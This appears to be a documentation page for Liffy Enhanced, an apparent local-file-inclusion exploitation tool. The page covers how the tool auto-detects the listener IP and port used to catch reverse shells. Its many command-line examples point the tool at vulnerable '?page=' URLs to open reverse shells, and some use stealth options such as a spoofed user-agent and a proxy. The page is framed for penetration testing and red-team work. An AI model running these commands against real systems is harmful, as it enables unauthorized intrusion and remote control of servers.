# 🔍 Auto-Detection Features

Liffy Enhanced includes powerful auto-detection capabilities for IP addresses and ports, making it easier to use without manual configuration.

## 🌐 IP Auto-Detection

### Automatic IP Detection

Liffy Enhanced can automatically detect the best IP address to use for reverse shells:

```bash
# Auto-detect IP address
python3 liffy_enhanced.py --url http://target/file.php?page= --auto --auto-ip --lport 4444

# Auto-detect both IP and port
python3 liffy_enhanced.py --url http://target/file.php?page= --auto --auto-ip --auto-port
```

### IP Detection Methods

The auto-detection system uses multiple methods to find the best IP:

1. **Network Interface Analysis**: Scans all network interfaces
2. **Target Network Matching**: Finds IP in same subnet as target
3. **Interface Priority**: Prefers ethernet over WiFi
4. **Fallback Services**: Uses public IP services as last resort

### Manual IP Selection

You can still specify IP addresses manually:

```bash
# Use specific IP
python3 liffy_enhanced.py --url http://target/file.php?page= --auto --lhost 192.168.1.100 --lport 4444

# Use public IP
python3 liffy_enhanced.py --url http://target/file.php?page= --auto --lhost 203.0.113.1 --lport 4444
```

## 🔌 Port Auto-Detection

### Automatic Port Detection

Liffy Enhanced can automatically find available ports:

```bash
# Auto-detect port
python3 liffy_enhanced.py --url http://target/file.php?page= --auto --lhost 192.168.1.100 --auto-port

# Auto-detect both IP and port
python3 liffy_enhanced.py --url http://target/file.php?page= --auto --auto-ip --auto-port
```

### Port Detection Logic

The system checks ports in this order:

1. **Suggested Ports**: 4444, 4445, 4446, 8080, 8081, 9000, 9001, 1234, 1235
2. **Sequential Search**: Checks ports starting from 4444
3. **Availability Check**: Ensures port is not in use

### Manual Port Selection

You can specify ports manually:

```bash
# Use specific port
python3 liffy_enhanced.py --url http://target/file.php?page= --auto --lhost 192.168.1.100 --lport 8080

# Use common service ports
python3 liffy_enhanced.py --url http://target/file.php?page= --auto --lhost 192.168.1.100 --lport 80
```

## 📊 Network Information

### View Network Information

Get detailed information about your network configuration:

```bash
# Show network information
python3 liffy_enhanced.py --show-network

# Show port information
python3 liffy_enhanced.py --list-ports
```

### Network Information Output

```
🌐 Network Information
==================================================

Local IP: 192.168.1.100
Public IP: 203.0.113.1
Best Local IP: 192.168.1.100

Network Interfaces:
  eth0 (ethernet): 192.168.1.100
  wlan0 (wifi): 192.168.1.101

Suggested Ports:
  4444: ✓
  4445: ✓
  4446: ✗
  8080: ✓
  8081: ✓
  9000: ✓
  9001: ✓
  1234: ✓
  1235: ✓

Best Available Port: 4444
```

## 🔧 Configuration

### Environment Variables

Set default auto-detection behavior:

```bash
# Enable auto IP detection by default
export LIFFY_AUTO_IP=true

# Enable auto port detection by default
export LIFFY_AUTO_PORT=true

# Set default port range
export LIFFY_PORT_START=4444
export LIFFY_PORT_MAX=4500
```

### Configuration File

Add auto-detection settings to your config file:

```json
{
  "target_url": "http://target/file.php?page=",
  "technique": "auto",
  "auto_ip": true,
  "auto_port": true,
  "lhost": null,
  "lport": null
}
```

## 🎯 Use Cases

### Penetration Testing

```bash
# Quick setup with auto-detection
python3 liffy_enhanced.py --url http://target/file.php?page= --auto --auto-ip --auto-port

# Target-specific IP detection
python3 liffy_enhanced.py --url http://192.168.1.50/file.php?page= --auto --auto-ip --auto-port
```

### Bug Bounty

```bash
# Stealth mode with auto-detection
python3 liffy_enhanced.py --url http://target/file.php?page= --auto \
  --auto-ip --auto-port \
  --user-agent "Mozilla/5.0" \
  --proxy http://127.0.0.1:8080
```

### Red Team Exercises

```bash
# Multi-threaded with auto-detection
python3 liffy_enhanced.py --url http://target/file.php?page= --auto \
  --auto-ip --auto-port \
  --threads 5
```

## 🔌 API Usage

### Auto-Detection via API

```bash
# Get network information
curl http://localhost:5000/api/network-info

# Auto-detect lhost and lport
curl -X POST http://localhost:5000/api/auto-detect \
  -H "Content-Type: application/json" \
  -d '{"target_url": "http://target/file.php?page="}'

# Get port information
curl http://localhost:5000/api/ports
```

### API Response Examples

```json
{
  "lhost": "192.168.1.100",
  "lport": 4444,
  "success": true
}
```

## 🚨 Troubleshooting

### Common Issues

#### No IP Detected
```bash
# Error: Could not auto-detect IP address
# Solution: Check network connectivity or specify manually
python3 liffy_enhanced.py --url http://target/file.php?page= --auto --lhost 192.168.1.100 --auto-port
```

#### No Port Available
```bash
# Error: No port available
# Solution: Check for port conflicts or specify manually
python3 liffy_enhanced.py --url http://target/file.php?page= --auto --auto-ip --lport 8080
```

#### Network Interface Issues
```bash
# Error: Network interface detection failed
# Solution: Run with elevated privileges or check network configuration
sudo python3 liffy_enhanced.py --url http://target/file.php?page= --auto --auto-ip --auto-port
```

### Debug Mode

Enable verbose output to see detection process:

```bash
# Verbose auto-detection
python3 liffy_enhanced.py --url http://target/file.php?page= --auto --auto-ip --auto-port --verbose
```

## 📚 Advanced Features

### Custom Port Ranges

```python
# In your script
from ip_utils import PortManager

# Find port in custom range
port = PortManager.get_available_port(start_port=9000, max_attempts=50)
print(f"Available port: {port}")
```

### Network Interface Filtering

```python
# In your script
from ip_utils import IPDetector

# Get only ethernet interfaces
interfaces = IPDetector.get_network_interfaces()
ethernet_interfaces = [iface for iface in interfaces if iface['type'] == 'ethernet']
```

### Target Network Detection

```python
# In your script
from ip_utils import IPDetector

# Get IP in same network as target
target_ip = IPDetector.get_target_network_ip("http://192.168.1.50/file.php?page=")
print(f"Target network IP: {target_ip}")
```

---

**Next**: [Configuration Guide](configuration.md) for advanced configuration options!
